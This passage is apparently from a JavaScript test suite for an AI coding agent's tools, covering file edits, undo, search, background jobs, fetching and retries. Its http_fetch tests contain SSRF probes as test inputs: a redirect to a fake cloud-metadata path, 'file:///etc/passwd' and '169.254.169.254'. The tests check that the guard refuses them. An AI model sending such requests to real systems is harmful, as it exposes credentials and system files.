    eq("JSONC: comments + trailing commas, // inside a string kept", q("ts.json", "compilerOptions.url").value, '"http://a//b"');
    eq("parsePath", JQ.parsePath("a.b[0]['x.y'].*"), ["a", "b", 0, "x.y", "*"]);
    ok("bad query is reported", /could not parse/.test(q("p.json", "a..b").error || ""));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("undo_edit — take back the agent's own last change to a file");
  {
    const { createEditUndo } = require("../lib/nexus/edit-undo");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "undo-")), f = path.join(dir, "x.txt"), g = path.join(dir, "new.txt");
    fs.writeFileSync(f, "v1");
    const u = createEditUndo();
    let s = u.snapshot([f]); fs.writeFileSync(f, "v2"); eq("a real change is recorded", u.commit(s), 1);
    s = u.snapshot([f]); fs.writeFileSync(f, "v3"); u.commit(s);
    s = u.snapshot([f]); eq("a no-op write is not recorded", u.commit(s), 0);
    ok("undo restores the previous version", u.undo(f).ok && fs.readFileSync(f, "utf8") === "v2");
    ok("undo again steps further back", u.undo(f).ok && fs.readFileSync(f, "utf8") === "v1");
    ok("nothing left to undo", /no edit of this file/.test(u.undo(f).error));
    s = u.snapshot([f]); fs.writeFileSync(f, "agent"); u.commit(s); fs.writeFileSync(f, "user edit");
    ok("refuses when the file changed since", /changed after that edit/.test(u.undo(f).error) && fs.readFileSync(f, "utf8") === "user edit");
    ok("force restores anyway", u.undo(f, { force: true }).ok && fs.readFileSync(f, "utf8") === "v1");
    s = u.snapshot([g]); fs.writeFileSync(g, "created"); u.commit(s);
    ok("undoing a create deletes the file", u.undo(g).ok && !fs.existsSync(g));
    const TG = require("../lib/nexus/tool-gates");
    ok("plan mode blocks undo_edit (it writes)", TG.isPlanBlocked("undo_edit"));
    ok("plan mode allows read_symbol + json_query", !TG.isPlanBlocked("read_symbol") && !TG.isPlanBlocked("json_query"));
    const NT = require("../lib/nexus/native-tools"), sc = NT.TOOL_SCHEMAS;
    ok("all three tools have schemas", ["read_symbol", "json_query", "undo_edit"].every((n) => sc[n] && sc[n].description));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("replace_in_files — one find/replace across many files");
  {
    const RF = require("../lib/nexus/replace-files");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "rif-")), rp = (p) => path.resolve(dir, p);
    fs.mkdirSync(path.join(dir, "src")); fs.mkdirSync(path.join(dir, "node_modules"));
    fs.writeFileSync(path.join(dir, "src/a.js"), "getUser(1);\ngetUserAll();\nconst getUser = 1;\n");
    fs.writeFileSync(path.join(dir, "src/b.ts"), "import { getUser } from './a';\n");
    fs.writeFileSync(path.join(dir, "node_modules/x.js"), "getUser();\n");
    fs.writeFileSync(path.join(dir, "price.txt"), "cost: 5\n");
    const run = (args, deps) => RF.replaceInFilesTool(args, dir, rp, deps);
    let r = run({ find: "getUser", replace: "fetchUser", word: true, dry_run: true });
    eq("dry run: counts whole-word matches only (getUserAll untouched)", [r.files, r.replacements, r.dry_run], [2, 3, true]);
    ok("dry run writes nothing", fs.readFileSync(path.join(dir, "src/a.js"), "utf8").startsWith("getUser(1)"));
    ok("samples show before → after", /getUser\(1\);  →  fetchUser\(1\);/.test(r.changed.find((c) => c.file === "src/a.js").samples[0]));
    const seen = [];
    r = run({ find: "getUser", replace: "fetchUser", word: true }, { onWrite: (f) => seen.push(f) });
    eq("applied", fs.readFileSync(path.join(dir, "src/a.js"), "utf8"), "fetchUser(1);\ngetUserAll();\nconst fetchUser = 1;\n");
    ok("node_modules skipped", fs.readFileSync(path.join(dir, "node_modules/x.js"), "utf8") === "getUser();\n");
    eq("onWrite called once per changed file (undo snapshots)", seen.length, 2);
    r = run({ find: "fetchUser", replace: "X", glob: "**/*.ts" });
    eq("glob limits files", r.changed.map((c) => c.file), ["src/b.ts"]);
    r = run({ find: "5", replace: "$1.00" });
    eq("literal mode: $ in the replacement is literal", fs.readFileSync(path.join(dir, "price.txt"), "utf8"), "cost: $1.00\n");
    r = run({ find: "cost: (\\S+)", replace: "price=$1", regex: true });
    eq("regex mode: $1 groups", fs.readFileSync(path.join(dir, "price.txt"), "utf8"), "price=$1.00\n");
    r = run({ find: "price", replace: "p" }, { check: (rel) => rel === "price.txt" ? "BLOCKED by policy: protected path" : null });
    ok("policy check skips + reports the file", r.files === 0 && /protected/.test(r.skipped[0].reason) && fs.readFileSync(path.join(dir, "price.txt"), "utf8").startsWith("price"));
    ok("no matches is a note, not an error", /no matches/.test(run({ find: "zzz_nope", replace: "y" }).note));
    ok("bad regex reported", /invalid regex/.test(run({ find: "(", replace: "", regex: true }).error));
    ok("brace globs", RF.globToRe("src/**/*.{js,ts}").test("src/x/y.ts") && !RF.globToRe("src/**/*.{js,ts}").test("src/y.py"));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("background jobs — new-output-only polling + stdin");
  {
    const B = require("../lib/nexus/bgjobs").createBgJobs();
    const id = B.start("srv", null, 0);
    B.append(id, "booting\n");
    eq("first read returns everything", B.readNew(id).text, "booting\n");
    B.append(id, "ready on 3000\n");
    const n = B.readNew(id);
    eq("next read returns only the new part", [n.text, n.earlier], ["ready on 3000\n", 8]);
    eq("nothing new → empty", B.readNew(id).text, "");
    ok("write to a job without a child is refused", /not running|no open stdin/.test(B.write(id, "x").error));
    const { spawn } = require("child_process");
    const cat = spawn("cat");
    const id2 = B.start("cat", cat, 0); cat.stdout.on("data", (d) => B.append(id2, d));
    ok("write to a running job's stdin", B.write(id2, "hello\n").ok);
    await new Promise((r) => setTimeout(r, 300));
    eq("echoed back", B.readNew(id2).text, "hello\n");
    B.stop(id2);
    const TG = require("../lib/nexus/tool-gates");
    ok("write_stdin is an exec tool (guarded + plan-blocked)", TG.isExecTool("write_stdin") && TG.isPlanBlocked("write_stdin"));
    ok("replace_in_files is plan-blocked", TG.isPlanBlocked("replace_in_files"));
  }

  group("wait_for — ready instead of sleep-guessing");
  {
    const WF = require("../lib/nexus/wait-for");
    const net = require("net");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wf-")), rp = (p) => path.resolve(dir, p);
    const srv = net.createServer(() => {}); await new Promise((r) => srv.listen(0, "127.0.0.1", r));
    const port = srv.address().port;
    let r = await WF.waitForTool({ port }, dir, rp, {});
    ok("open port → ready", r.ready === true);
    srv.close();
    r = await WF.waitForTool({ port, timeout_s: 1 }, dir, rp, {});
    ok("closed port → times out", r.ready === false && /timed out/.test(r.note));
    setTimeout(() => fs.writeFileSync(path.join(dir, "flag"), "x"), 200);
    r = await WF.waitForTool({ file: "flag", timeout_s: 3 }, dir, rp, {});
    ok("file appears → ready", r.ready === true && r.waited_s < 3);
    const B = require("../lib/nexus/bgjobs").createBgJobs(), id = B.start("srv", null, 0);
    setTimeout(() => B.append(id, "compiling\nListening on http://localhost:5173\n"), 200);
    r = await WF.waitForTool({ job: id, pattern: "listening on", timeout_s: 3 }, dir, rp, { jobs: B });
    ok("job pattern → ready with the matching line", r.ready === true && /5173/.test(r.line));
    ok("remote URLs refused (local only)", /only checks local/.test((await WF.waitForTool({ url: "https://example.com" }, dir, rp, {})).error));
    ok("needs a target", /needs one of/.test((await WF.waitForTool({}, dir, rp, {})).error));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("search — grouped by file, match-centred clipping, context, generated files skipped");
  {
    const SR = require("../lib/nexus/search");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "srch-")), rp = (p) => path.resolve(dir, p);
    fs.mkdirSync(path.join(dir, "src"));
    fs.writeFileSync(path.join(dir, "src/a.js"), "one\ntwo\nconst token = 1;\nfour\nfive\nsix\nseven\nuse(token);\n");
    fs.writeFileSync(path.join(dir, "src/b.py"), "token = 2\n");
    fs.writeFileSync(path.join(dir, "app.min.js"), "x".repeat(900) + "token" + "y".repeat(900));
    fs.writeFileSync(path.join(dir, "package-lock.json"), "{\"token\":1}");
    fs.writeFileSync(path.join(dir, "img.bin"), Buffer.from([0, 1, 2, 116, 111, 107, 101, 110]));
    const q = (args) => SR.searchTool(args, dir, rp);
    let r = q({ pattern: "token" });
    eq("summary counts matches + files", r.summary, "Found 3 matches in 2 files");
    ok("path written once per file", r.results.split("\n").filter((l) => l === "src/a.js").length === 1 && /\n  3: const token = 1;/.test(r.results));
    ok("lockfile + minified skipped and reported", /2 lockfile\/minified/.test(r.skipped_generated));
    ok("binary skipped", !/img\.bin/.test(r.results));
    r = q({ pattern: "token", include_generated: true });
    ok("include_generated searches them; long line cut AROUND the match", /app\.min\.js\n  1: …x+token/.test(r.results) && r.results.split("\n").find((l) => /token/.test(l) && /min/.test(r.results) && l.length < 220));
    r = q({ pattern: "token", context: 1, glob: "**/*.js" });
    eq("context lines + separator between distant hits", r.results, "src/a.js\n  2- two\n  3: const token = 1;\n  4- four\n  --\n  7- seven\n  8: use(token);");
    eq("case_sensitive", q({ pattern: "TOKEN", case_sensitive: true }).summary, "No matches found");
    eq("literal", q({ pattern: "use(", literal: true }).summary, "Found 1 match in 1 file");
    ok("max_results truncates and says so", /stopped at 1/.test(q({ pattern: "token", max_results: 1 }).truncated));
    const TF2 = require("../lib/cli/tui-format");
    ok("card shows the real count (was always 'Found 1 line')", /Found 3 matches/.test(TF2.toolResultView("search", { pattern: "token" }, q({ pattern: "token" }), {}).lines[0].text));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("find — real globs (it used to substring-match the glob text, so **/*.js found nothing)");
  {
    const SR = require("../lib/nexus/search");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "find-")), rp = (p) => path.resolve(dir, p);
    fs.mkdirSync(path.join(dir, "src/ui"), { recursive: true }); fs.mkdirSync(path.join(dir, "node_modules"));
    for (const f of ["src/a.js", "src/ui/b.jsx", "src/ui/c.ts", "README.md", "node_modules/x.js"]) fs.writeFileSync(path.join(dir, f), "x");
    const f = (args) => SR.findTool(args, dir, rp);
    eq("**/*.js", f({ glob: "**/*.js" }).files, ["src/a.js"]);
    eq("brace glob", f({ glob: "src/**/*.{jsx,ts}" }).files, ["src/ui/b.jsx", "src/ui/c.ts"]);
    eq("bare *.md matches by file name anywhere", f({ glob: "*.md" }).files, ["README.md"]);
    eq("no glob chars = name substring", f({ glob: "ui" }).files, []);
    eq("substring of a file name", f({ glob: "b.js" }).files, ["src/ui/b.jsx"]);
    const past = Date.now() / 1000 - 1000; fs.utimesSync(path.join(dir, "src/a.js"), past, past);
    eq("sort recent = newest first", f({ glob: "src/**", sort: "recent" }).files.slice(-1), ["src/a.js"]);
    ok("truncation reported", /showing 1 of 4/.test(f({ glob: "**/*", max_results: 1 }).truncated));
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("fs tools — move/copy never silently overwrite, copy folders, honest delete, list_dir");
  {
    const FT = require("../lib/nexus/fs-tools");
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "fst-")), rp = (p) => path.resolve(dir, p), P = (p) => path.join(dir, p), rd = (p) => fs.readFileSync(P(p), "utf8");
    fs.mkdirSync(P("src/lib"), { recursive: true }); fs.mkdirSync(P("out"));
    fs.writeFileSync(P("a.txt"), "A"); fs.writeFileSync(P("b.txt"), "B"); fs.writeFileSync(P("src/lib/x.js"), "X");
    ok("move onto an existing file is refused (was silent data loss)", /already exists/.test(FT.moveTool({ from: "a.txt", to: "b.txt" }, dir, rp).error) && rd("b.txt") === "B" && rd("a.txt") === "A");
    ok("overwrite:true replaces", FT.moveTool({ from: "a.txt", to: "b.txt", overwrite: true }, dir, rp).ok && rd("b.txt") === "A" && !fs.existsSync(P("a.txt")));
    ok("move into an existing folder keeps the name", FT.moveTool({ from: "b.txt", to: "out" }, dir, rp).ok && rd("out/b.txt") === "A");
    ok("move creates missing parent folders", FT.moveTool({ from: "out/b.txt", to: "new/deep/b.txt" }, dir, rp).ok && rd("new/deep/b.txt") === "A");
    ok("cannot move a folder into itself", /into itself/.test(FT.moveTool({ from: "src", to: "src/lib/inner" }, dir, rp).error));
    ok("copy a whole folder (used to fail)", FT.copyTool({ from: "src", to: "src2" }, dir, rp).ok && rd("src2/lib/x.js") === "X");
    ok("copy onto an existing file is refused", /already exists/.test(FT.copyTool({ from: "src/lib/x.js", to: "src2/lib/x.js" }, dir, rp).error || ""));
    ok("copy a folder onto an existing folder nests it, like cp", FT.copyTool({ from: "src", to: "src2" }, dir, rp).ok && rd("src2/src/lib/x.js") === "X");
    ok("delete of a missing path says so (was a plain ok)", /already gone/.test(FT.deleteTool({ path: "nope.txt" }, dir, rp).note));
    ok("non-empty folder needs recursive", /recursive:true/.test(FT.deleteTool({ path: "src2" }, dir, rp).error) && fs.existsSync(P("src2")));
    ok("recursive delete works", FT.deleteTool({ path: "src2", recursive: true }, dir, rp).ok && !fs.existsSync(P("src2")));
    ok("project root is never deleted", /project root/.test(FT.deleteTool({ path: "." }, dir, rp).error));
    fs.writeFileSync(P("0first.txt"), "12345");
    let r = FT.listDirTool({}, dir, rp);
    ok("list_dir: folders first, then files with sizes", r.items[0].endsWith("/") && r.items[r.items.length - 1] === "0first.txt  5 B");
    r = FT.listDirTool({ depth: 3 }, dir, rp);
    ok("depth shows a tree", r.items.includes("    x.js  1 B"));
    r = FT.listDirTool({ max_results: 1 }, dir, rp);
    ok("cut-off is reported", /showing 1 of/.test(r.truncated));
    const { createEditUndo } = require("../lib/nexus/edit-undo"), u = createEditUndo();
    fs.writeFileSync(P("keep.txt"), "precious");
    const sn = u.snapshot([P("keep.txt")]); FT.deleteTool({ path: "keep.txt" }, dir, rp); u.commit(sn);
    ok("a deleted file can be restored with undo_edit", u.undo(P("keep.txt")).ok && rd("keep.txt") === "precious");
    fs.rmSync(dir, { recursive: true, force: true });
  }

  group("http_fetch — redirects re-checked by the SSRF guard, HTML as text, whole UTF-8");
  {
    const HF = require("../lib/nexus/http-fetch");
    const http = require("http");
    const srv = http.createServer((req, res) => {
      if (req.url === "/r1") { res.writeHead(302, { location: "/page" }); return res.end(); }
      if (req.url === "/evil") { res.writeHead(301, { location: "http://blocked.internal/latest/meta-data" }); return res.end(); }
      if (req.url === "/page") { res.writeHead(200, { "content-type": "text/html; charset=utf-8" }); return res.end("<html><head><title>Page</title><script>x()</script></head><body><p>héllo wörld ✓</p><a href=\"/next\">Next</a></body></html>"); }
      if (req.url === "/img") { res.writeHead(200, { "content-type": "image/png" }); return res.end(Buffer.alloc(300)); }
      if (req.url === "/big") { res.writeHead(200, { "content-type": "text/plain" }); return res.end("x".repeat(25000)); }
      // multi-byte character split across two chunks
      if (req.url === "/split") { res.writeHead(200, { "content-type": "text/plain" }); const b = Buffer.from("añb"); res.write(b.subarray(0, 2)); setTimeout(() => res.end(b.subarray(2)), 20); return; }
      res.writeHead(404); res.end();
    });
    await new Promise((r) => srv.listen(0, "127.0.0.1", r));
    const base = "http://127.0.0.1:" + srv.address().port;
    const deps = { isLocal: (u) => /blocked\.internal/.test(u) }; // the real guard would also block 127.0.0.1; here only the redirect target is "private"
    let r = await HF.httpFetchTool({ url: base + "/r1" }, deps);
    ok("redirect followed to the final page", r.status === 200 && r.finalUrl === base + "/page");
    ok("HTML → readable text: title, words, absolute link; no script", /^# Page/.test(r.body) && /héllo wörld ✓/.test(r.body) && r.body.includes("[Next](" + base + "/next)") && !/x\(\)/.test(r.body));
    ok("raw:true keeps the markup", /<script>/.test((await HF.httpFetchTool({ url: base + "/page", raw: true }, deps)).body));
    r = await HF.httpFetchTool({ url: base + "/evil" }, deps);
    ok("a redirect to a blocked host is refused (SSRF via redirect)", /blocked/.test(r.error) && /via a redirect/.test(r.error));
    r = await HF.httpFetchTool({ url: base + "/img" }, deps);
    ok("binary is described, not dumped", r.binary === true && r.bytes === 300 && r.body === undefined);
    r = await HF.httpFetchTool({ url: base + "/big" }, deps);
    ok("a cut body says so", r.body.length === 20000 && /of 25000 chars/.test(r.truncated));
    eq("UTF-8 split across chunks decodes whole", (await HF.httpFetchTool({ url: base + "/split" }, deps)).body, "añb");
    ok("non-http schemes refused", /only http/.test((await HF.httpFetchTool({ url: "file:///etc/passwd" }, deps)).error));
    const { isLocalTarget } = require("../lib/governance/default-guard");
    ok("the real guard blocks cloud metadata", /SSRF/.test((await HF.httpFetchTool({ url: "http://169.254.169.254/" }, { isLocal: isLocalTarget })).error));
    srv.close();
  }

  group("edit failures say WHY — closest line, already applied, where the duplicates are");
  {
    const E = require("../lib/nexus/edit");
    const src = "function login(user) {\n  if (!user) return null;\n  return check(user.password);\n}\nx\nx\n";
    ok("typo → closest line with its number", /closest line 3: return check\(user\.password\);/.test(E.applyEditsFlexible(src, [{ find: "  return check(user.passwrd);", replace: "y" }]).error));
    ok("already applied is detected", /already applied/.test(E.applyEditsFlexible(src, [{ find: "check(user.pw)", replace: "return check(user.password);" }]).error));
    ok("ambiguous lists the lines", /matches 2 places \(lines 5, 6\)/.test(E.applyEditsFlexible(src, [{ find: "x", replace: "y" }]).error));
    ok("curly quotes called out", /curly quotes/.test(E.applyEditsFlexible("say(\"hi\")\n", [{ find: "say(“hi”)", replace: "z" }]).error));
    ok("no hint when nothing is close", /not present \(even ignoring whitespace\)$/.test(E.applyEditsFlexible(src, [{ find: "totally unrelated text here", replace: "z" }]).error));
    ok("patch context miss gets the hint too", /closest line/.test(E.applyHunks(src, [{ before: ["  return check(user.passwrd);"], after: ["  return 1;"] }]).error));
    eq("whereLines", E.whereLines("a\nb\na\na", "a"), [1, 3, 4]);
    ok("dice similarity", E.dice("hello world", "hello wrld") > 0.8 && E.dice("abc", "xyz") === 0);
  }

  // ── coderShell: closed stdin, tree kill on timeout/interrupt, utf8, exit codes ──
  if (process.platform !== "win32") {
    const { coderShell } = require("../lib/nexus/shell-run");
    const os = require("os");
    const r1 = await coderShell("read x; echo got:[$x]", os.tmpdir());
    ok("stdin is closed — a prompt gets EOF, no hang", r1.code === 0 && /got:\[\]/.test(r1.output));
    const t0 = Date.now();
    const r2 = await coderShell("sleep 30 & echo started; wait", os.tmpdir(), { timeoutMs: 1000 });
    ok("timeout returns promptly even with a child holding the pipe", Date.now() - t0 < 5000 && r2.timedOut === true && r2.code === 124);
    ok("timeout note keeps the output and points at run_background", /^started/.test(r2.output) && /timed out after 1s/.test(r2.output) && /run_background/.test(r2.output));
    const ctl = { stopped: false }; setTimeout(() => { ctl.stopped = true; }, 300);
    const r3 = await coderShell("sleep 30", os.tmpdir(), { ctl });
    ok("interrupt via ctl kills it", r3.interrupted === true && r3.code === 130 && /interrupted/.test(r3.output));
    eq("exit code passes through", (await coderShell("exit 3", os.tmpdir())).code, 3);
    ok("utf8 survives chunking", /héllo — ✓/.test((await coderShell("printf 'h\\303\\251llo \\342\\200\\224 \\342\\234\\223'", os.tmpdir())).output));
    ok("git never prompts", /^0$/m.test((await coderShell("echo $GIT_TERMINAL_PROMPT", os.tmpdir())).output));
  }

  // ── list_processes: busiest first, kernel threads dropped, filter/pid/port ──
  {
    const P = require("../lib/nexus/procs");
    const ps = "  PID  PPID %CPU %MEM     ELAPSED COMMAND\n    1     0  0.0  0.1  9-00:00:00 /sbin/init\n    2     0  0.0  0.0  9-00:00:00 [kthreadd]\n  500     1 45.5  2.0       10:00 node server.js --port 3000\n  600     1  3.0  9.0       01:00 python worker.py\n  700   500  0.0  0.0       00:00 ps -Ao pid,ppid,pcpu,pmem,etime,args\n";
    eq("parsePs rows", P.parsePs(ps).length, 5);
    const r = P.listProcessesTool({}, { ps });
    ok("sorted by cpu, kernel thread + own ps dropped", r.count === 3 && /^500 /m.test(r.processes.split("\n")[1]) && !/kthreadd|ps -Ao/.test(r.processes));
    ok("filter by name", /worker\.py/.test(P.listProcessesTool({ filter: "WORKER" }, { ps }).processes));
    eq("filter by pid", P.listProcessesTool({ filter: "500" }, { ps }).count, 1);
    ok("no match says so", /no running process matches/.test(P.listProcessesTool({ filter: "nginx" }, { ps }).note));
    ok("port → owning process", /server\.js/.test(P.listProcessesTool({ port: 3000 }, { ps, portLookup: () => ({ pids: new Set([500]), listening: true }) }).processes));
    ok("free port", /nothing is listening on :3001/.test(P.listProcessesTool({ port: 3001 }, { ps, portLookup: () => ({ pids: new Set(), listening: false }) }).note));
    ok("max truncates with a hint", /showing the 1 busiest of 3/.test(P.listProcessesTool({ max: 1 }, { ps }).truncated));
    ok("long command clipped", P.formatRows([{ pid: 1, ppid: 0, cpu: 0, mem: 0, age: "1", cmd: "x".repeat(400) }], 5).length < 260);
  }

  // ── web_search: per-block parsing (no snippet drift), ads dropped, captcha reported ──
  {
    const W = require("../lib/nexus/web-search");
    const blk = (cls, href, title, snip) => '<div class="result ' + cls + '"><h2><a rel="nofollow" class="result__a" href="' + href + '">' + title + '</a></h2>' + (snip ? '<a class="result__snippet" href="x">' + snip + '</a>' : '') + '</div>';
    const html = blk("result--ad", "https://duckduckgo.com/y.js?ad=1", "AD", "buy") + blk("web-result", "//duckduckgo.com/l/?uddg=" + encodeURIComponent("https://a.dev/x?y=1&z=2") + "&rut=1", "A &amp; <b>B</b>", "") + blk("web-result", "https://c.dev/", "C&#x27;s", "snip &#39;c&#39;");
    const r = W.parseDdg(html, 8);
    eq("ads dropped, uddg decoded", r.map((x) => x.url), ["https://a.dev/x?y=1&z=2", "https://c.dev/"]);
    ok("missing snippet does not shift the next one", r[0].snippet === undefined && r[1].snippet === "snip 'c'");
    eq("entities decoded", r.map((x) => x.title), ["A & B", "C's"]);
    ok("captcha page detected", W.isBlocked(202, "") && W.isBlocked(200, '<div class="anomaly-modal__title">') && !W.isBlocked(200, html));
    ok("captcha → clear error", /rate-limiting/.test((await W.webSearchTool({ query: "x" }, { get: (cb) => cb(null, 202, "") })).error));
    ok("no results note", /no results/.test((await W.webSearchTool({ query: "x" }, { get: (cb) => cb(null, 200, "<div>No  results.</div>") })).note));
    eq("max_results honored", (await W.webSearchTool({ query: "x", max_results: 1 }, { get: (cb) => cb(null, 200, html) })).results.length, 1);
  }

  // ── protocol recovery: one retry with the bad reply shown, then prose = the answer ──
  {
    const PR = require("../lib/nexus/proto-reply");
    const st = { bad: 0 }, msgs = [];
    eq("first bad reply retries", PR.badProtoReply("It adds numbers.", msgs, st).stop, false);
    ok("model sees what it sent + the exact shape", msgs[0].role === "assistant" && msgs[0].content === "It adds numbers." && /ONE JSON object/.test(msgs[1].content));
    const r2 = PR.badProtoReply("It adds two numbers.", msgs, st);
    ok("second bad reply → prose becomes the answer", r2.stop && r2.answer === "It adds two numbers.");
    const st2 = { bad: 1 };
    ok("broken JSON is not shown as an answer", PR.badProtoReply('{"action": "too', [], st2).answer === null);
    ok("empty reply pushes no assistant message", (() => { const m = []; PR.badProtoReply("", m, { bad: 0 }); return m.length === 1; })());
    const st3 = { bad: 0 }, m3 = [];
    ok("missing tool name → specific correction", !PR.missingTool({ action: "tool" }, m3, st3).stop && /Missing "tool"/.test(m3[0].content));
    ok("unknown action → explains the two actions", (PR.missingTool({ action: "think" }, m3, st3), /must be "tool"/.test(m3[1].content)));
    ok("gives up on the third", PR.missingTool({ action: "x" }, m3, st3).stop);
  }

  // ── model API retry: transient failures retried (Retry-After honored), real errors not ──
  {
    const R = require("../lib/nexus/retry");
    const err = (status, extra) => Object.assign(new Error("e" + status), { status }, extra || {});
    const waits = [];
    const fake = { sleep: async (ms) => { waits.push(ms); } };
    let n = 0;
    eq("429 twice then ok", await R.withRetry(async () => { if (++n <= 2) throw err(429, { retryAfter: "3" }); return "ok"; }, null, fake), "ok");
    eq("Retry-After seconds honored", waits, [3000, 3000]);
    let calls = 0;
    try { await R.withRetry(async () => { calls++; throw err(401); }, null, fake); } catch (_) {}
    eq("401 is not retried", calls, 1);
    calls = 0; let msg = "";
    try { await R.withRetry(async () => { calls++; throw err(529); }, null, fake); } catch (e) { msg = e.message; }
    ok("gives up after 3 retries and says so", calls === 4 && /after 3 retries/.test(msg));
    ok("dropped connection retried, refused is not", R.isRetryable(Object.assign(new Error("x"), { code: "ECONNRESET" })) && !R.isRetryable(Object.assign(new Error("x"), { code: "ECONNREFUSED" })));
    ok("timeout (no response) not retried", !R.isRetryable(new Error("Ollama timed out (no response)")));
    eq("Retry-After http date", R.retryAfterMs(new Date(10000).toUTCString(), 4000), 6000);
    const ac = new AbortController(); calls = 0;
    try { await R.withRetry(async () => { calls++; ac.abort(); throw err(503); }, ac.signal, fake); } catch (_) {}
    eq("interrupt stops retrying", calls, 1);
    ok("real sleep aborts promptly", await R.withRetry(async () => { throw err(503, { retryAfter: "50" }); }, AbortSignal.timeout(50)).then(() => false, (e) => /interrupted|e503/.test(e.message)));
    ok("backoff without Retry-After grows and caps", await (() => { const w = []; let k = 0; return R.withRetry(async () => { if (++k < 4) throw err(503); return 1; }, null, { sleep: async (ms) => w.push(ms) }).then(() => w[0] >= 2000 && w[1] >= 4000 && w[2] >= 8000 && w.every((x) => x <= 60000)); })());
  }

  // ── read ranges: every spelling a model uses resolves to the same lines ──
  {
    const { lineRange } = require("../lib/nexus/line-range");
    eq("offset/limit", lineRange({ offset: 301, limit: 300 }), { off: 301, lim: 300 });
    eq("start/end", lineRange({ start: 301, end: 600 }), { off: 301, lim: 300 });
    eq("start_line/end_line", lineRange({ start_line: "10", end_line: "12" }), { off: 10, lim: 3 });
    eq("lines string", lineRange({ lines: "120-180" }), { off: 120, lim: 61 });
    eq("lines open-ended", lineRange({ lines: "50:" }), { off: 50, lim: null });
    eq("nothing = whole file", lineRange({}), { off: 1, lim: null });
    eq("end before start → one line", lineRange({ start: 9, end: 3 }), { off: 9, lim: 1 });
  }

  // ── supersede is range-aware: chunked reads keep every chunk ──
  {
    const { supersedeReread } = require("../lib/nexus/costsave");
    const big = (t) => ({ role: "tool", content: t + "x".repeat(300) });
    const msgs = [big("c1"), big("c2"), big("c3")], snap = new Map();
    supersedeReread(msgs, snap, "/f", "f", 0, "1-300");
    supersedeReread(msgs, snap, "/f", "f", 1, "301-600");
    ok("a different range does not erase the earlier chunk", msgs[0].content.startsWith("c1"));
    supersedeReread(msgs, snap, "/f", "f", 2, "1-300");
    ok("the same range re-read supersedes the old copy", /^\[superseded .* lines 1-300/.test(msgs[0].content) && msgs[1].content.startsWith("c2"));
    msgs.push(big("full"));
    supersedeReread(msgs, snap, "/f", "f", 3);
    ok("a full read supersedes every earlier partial", msgs.slice(0, 3).every((m) => m.content.startsWith("[superseded")) && msgs[3].content.startsWith("full"));
    msgs.push(big("p"));
    supersedeReread(msgs, snap, "/f", "f", 4, "10-20");
    ok("a partial read after a full one keeps the full copy", msgs[3].content.startsWith("full"));
  }

  // ── fitWindow: oldest tool results give way before the request outgrows the window ──
  {
    const { fitWindow } = require("../lib/nexus/costsave");
    const call = (p, st) => ({ role: "assistant", content: JSON.stringify({ action: "tool", tool: "read_file", args: { path: p, start: st } }) });
    const res = (t) => ({ role: "tool", content: t + "y".repeat(5000) });
    const mk = () => [{ role: "system", content: "S".repeat(3000) }, { role: "user", content: "the task" }, call("big.js", 1), res("r1"), call("big.js", 301), res("r2"), call("big.js", 601), res("r3"), call("big.js", 901), res("r4")];
    const m1 = mk();
    eq("fits already → untouched", fitWindow(m1, 1e6), 0);
    const m2 = mk(), removed = fitWindow(m2, 15000, 2);
    ok("over budget → oldest results stubbed", removed > 0 && /^\[earlier read_file big\.js from line 1 result removed/.test(m2[3].content));
    ok("stub names the exact call to redo", /from line 301/.test(m2[5].content));
    ok("system, task and the last 2 results kept", m2[0].content.length === 3000 && m2[1].content === "the task" && m2[7].content.startsWith("r3") && m2[9].content.startsWith("r4"));
    ok("only removes as much as needed", (() => { const m = mk(); fitWindow(m, 20000, 2); return m[3].content.startsWith("[earlier") && m[5].content.startsWith("r2"); })());
  }

  // ── edit results show the changed lines; "already applied" needs a distinctive replacement ──
  {
    const E = require("../lib/nexus/edit");
    const src = "const x = 1;\nfunction add(a, b) {\n  return b;\n}\n";
    const r = E.changedRegion(src, src.replace("return b;", "return a + b;"));
    ok("changed line numbered with context", r.lines === "3" && /    3  \s*return a \+ b;/.test(r.now) && /    2  function add/.test(r.now) && /    4  }/.test(r.now));
    eq("no change → null", E.changedRegion(src, src), null);
    ok("deletion reported", /deleted at line 3/.test(E.changedRegion(src, src.replace("  return b;\n", "")).now));
    const long = Array.from({ length: 60 }, (_, i) => "l" + i).join("\n");
    const lr = E.changedRegion(long, long.replace(/l(\d+)/g, (m, d) => d >= 10 && d < 50 ? "X" + d : m), 12);
    ok("big change is summarized", lr.lines === "11-50" && /more changed lines/.test(lr.now) && lr.now.split("\n").length === 13);
    const after = "const x = 1;\nfunction add(a, b) {\n  return a + b;\n}\n";
    ok("short replacement that occurs by chance is NOT 'already applied'", !/already applied/.test(E.applyEditsFlexible(after, [{ find: "return a - b;", replace: "x" }]).error));
    ok("a real already-applied edit still says so", /already applied/.test(E.applyEditsFlexible(after, [{ find: "  return b;", replace: "  return a + b;" }]).error));
  }

  // ── background jobs: forgiving ids, whole-tree stop, "is this port ours?" ──
  {
    const { createBgJobs } = require("../lib/nexus/bgjobs");
    const J = createBgJobs();
    const id = J.start("srv", { pid: 0, kill() {} }, 1);
    eq("bg1 / 1 / '#1' / 'job 1' all resolve", ["bg1", "1", 1, "#1", "job 1"].map((x) => J.key(x)), [id, id, id, id, id]);
    eq("no id + one running job → that job", J.key(""), id);
    eq("unknown id → null", J.key("7"), null);
    ok("unknown-id hint lists the jobs", /bg1 running: srv/.test(J.known()));
    const P = require("../lib/nexus/procs");
    const ps = "PID PPID %CPU %MEM ELAPSED COMMAND\n  100     1  0.0  0.0  01:00 sh -c npm run dev\n  101   100  0.0  0.0  01:00 npm run dev\n  102   101  0.0  0.0  01:00 node server.js\n  200     1  0.0  0.0  01:00 postgres\n";
    ok("listener that descends from our job is ours", P.portOwnedBy(3000, [100], { ps, portLookup: () => ({ pids: new Set([102]) }) }));
